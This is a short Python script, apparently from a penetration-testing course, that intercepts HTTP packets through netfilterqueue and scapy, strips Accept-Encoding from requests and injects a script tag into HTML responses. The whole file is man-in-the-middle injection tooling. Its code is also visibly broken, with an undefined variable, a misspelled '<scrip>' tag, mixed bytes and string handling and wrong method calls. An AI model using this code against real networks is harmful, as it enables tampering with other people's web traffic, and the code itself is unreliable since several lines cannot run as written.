#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

ack_list = []


def set_load(packet, load):
    http_packet[scapy.Raw].load = load
    del http_packet[scapy.IP].len
    del http_packet[scapy.IP].chksum
    del http_packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        load = http_packet[scapy.Raw].load
        if http_packet[scapy.TCP].dport == 80:
            print("[+] Request...")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif http_packet[scapy.TCP].sport == 80:
            print("[+] Response...")
            injection_code = "<scrip>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", load)

            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1).encode()
                new_content_length = content_length + len(injection_code).decode()
                load = load.replace(content_length, new_content_length).decode()
                print(new_content_length)

        if load != http_packet[scapy.Raw].load:
            new_packet = set_load(http_packet, load)
            packet.setpayload(str(new_packet))

    packet.accept()
    send(http_packet)

# queue = netfilterqueue.NetfilterQueue()
# queue.bind(0, process_packet)
# queue.run()
